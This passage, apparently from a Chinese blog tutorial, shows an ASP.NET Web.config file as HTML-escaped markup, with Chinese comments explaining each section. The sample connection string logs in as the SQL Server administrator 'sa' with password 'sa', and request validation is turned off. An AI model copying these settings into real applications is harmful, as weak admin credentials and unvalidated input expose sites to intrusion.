style=&quot;font-family:新宋体;color:green;font-size:12px&quot;&gt;文件是一个xml文件，configuration是xml文件的根节点，由于xml文件的根节点只能有一个，所以Webconfig的所有配置都是在这个节点内进行的。&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;lt;&lt;/span&gt;&lt;strong&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:16px&quot;&gt;configuration&lt;/span&gt;&lt;/strong&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;lt;!--&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:green;font-size:12px&quot;&gt;指定配置节和命名空间声明。clear:移除对继承的节和节组的所有引用，只允许由当前 section 和 sectionGroup 元素添加的节和节组。remove:移除对继承的节和节组的引用。&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:green;font-size:12px&quot;&gt; section:&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:green;font-size:12px&quot;&gt;定义配置节处理程序与配置元素之间的关联。sectionGroup:定义配置节处理程序与配置节之间的关联。&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;lt;&lt;/span&gt;&lt;strong&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:16px&quot;&gt;configSections&lt;/span&gt;&lt;/strong&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;sectionGroup&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;name&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;system.web.extensions&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;type&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;System.Web.Configuration.SystemWebExtensionsSectionGroup, System.Web.Extensions, Version=1.0.61025.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;sectionGroup&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;name&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;scripting&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;type&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;System.Web.Configuration.ScriptingSectionGroup, System.Web.Extensions, Version=1.0.61025.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;section&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;name&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;scriptResourceHandler&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;type&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;System.Web.Configuration.ScriptingScriptResourceHandlerSection, System.Web.Extensions, Version=1.0.61025.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;requirePermission&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;false&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;allowDefinition&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;MachineToApplication&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;/&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;sectionGroup&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp;&amp;lt;/&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;sectionGroup&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;section&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;name&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;strong&gt;&lt;span style=&quot;color:blue&quot;&gt;rewriter&lt;/span&gt;&lt;/strong&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;type&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;Intelligencia.UrlRewriter.Configuration.RewriterConfigurationSectionHandler, Intelligencia.UrlRewriter&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt; /&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;lt;/&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;configSections&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;lt;!--&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:green;font-size:12px&quot;&gt;appSettings&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:green;font-size:12px&quot;&gt;是应用程序设置,可以定义应用程序的全局常量设置等信息&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;lt;&lt;/span&gt;&lt;strong&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:16px&quot;&gt;appSettings&lt;/span&gt;&lt;/strong&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;add&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;key&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;1&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;value&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;1&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt; /&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;add&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;key&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;gao&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;value&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;weipeng&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt; /&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;lt;/&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;appSettings&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;lt;!--&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:green;font-size:12px&quot;&gt;连接字符串设置&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;lt;&lt;/span&gt;&lt;strong&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:16px&quot;&gt;connectionStrings&lt;/span&gt;&lt;/strong&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;add&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;name&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;ConnString&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;connectionString&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;Data Source=GAO;Initial Catalog=HBWXDate;User ID=sa;password=sa&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span style=&quot;color:maroon&quot;&gt;add&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;add&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;name&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;111&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;connectionString&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;11111&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt; /&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;lt;/&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;connectionStrings&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;br /&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;lt;!--&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:green;font-size:12px&quot;&gt;指定应用子配置设置的资源，并锁定配置设置，以防止它们被子配置文件重写。page指定应用包含的配置设置的资源.allowOverride是否允许配置文件的重写，提高配置文件的安全性&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;lt;&lt;/span&gt;&lt;strong&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:16px&quot;&gt;location&lt;/span&gt;&lt;/strong&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;path&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;Default.aspx&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;allowOverride&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;false&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;lt;!--&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:green;font-size:12px&quot;&gt;控制asp.net运行时的行为&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;lt;&lt;/span&gt;&lt;strong&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:16px&quot;&gt;system.web&lt;/span&gt;&lt;/strong&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp;&amp;lt;!--&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:green;font-size:12px&quot;&gt;identity&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:green;font-size:12px&quot;&gt;控制web应用程序的身份验证标识.&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;strong&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:16px&quot;&gt;identity&lt;/span&gt;&lt;/strong&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;impersonate&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;false&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt; /&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp;&amp;lt;!--&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:green;font-size:12px&quot;&gt;标识特定于页的配置设置（如是否启用会话状态、视图状态，是否检测用户的输入等）。&amp;lt;pages&amp;gt;可以在计算机、站点、应用程序和子目录级别声明.&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:green;font-size:12px&quot;&gt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:green;font-size:12px&quot;&gt;这里的几个属性的意思是默认主页为Index,主题是Default，不检测用户在浏览器输入的内容中是否存在潜在的危险数据（注：该项默认是检测，如果你使用了不检测，一要对用户的输入进行编码或验证)，在从客户端回发页时将检查加密的视图状态，以验证视图状态是否已在客户端被篡改。(注：该项默认是不验证）禁用ViewState&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;strong&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:16px&quot;&gt;pages&lt;/span&gt;&lt;/strong&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;masterPageFile&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;Index&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;theme&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;Default&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;buffer&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;true&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;enableViewStateMac&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;true&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;validateRequest&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;false&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;enableViewState&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;false&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;!--&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:green;font-size:12px&quot;&gt;controls&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:green;font-size:12px&quot;&gt;元素定义标记前缀所在的 register 指令和命名空间的集合&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;controls&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;controls&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;!--&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:green;font-size:12px&quot;&gt;将在程序集预编译期间使用的导入指令的集合&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;namespaces&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;namespaces&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp;&amp;lt;/&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;pages&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp;&amp;lt;!--&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:green;font-size:12px&quot;&gt;默认错误页设置,mode:具有On,Off,RemoteOnly 3种状态。On表示始终显示自定义的信息; Off表示始终显示详细的asp.net错误信息; RemoteOnly表示只对不在本地Web服务器上运行的用户显示自定义信息.defaultRedirect:用于出现错误时重定向的URL地址&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;strong&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:16px&quot;&gt;customErrors&lt;/span&gt;&lt;/strong&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;defaultRedirect&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;Err.html&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;mode&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;RemoteOnly&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;!--&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:green;font-size:12px&quot;&gt;特殊代码编号的错误从定向文件&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;error&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;statusCode&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;403&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;redirect&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;NoAccess.htm&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt; /&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span 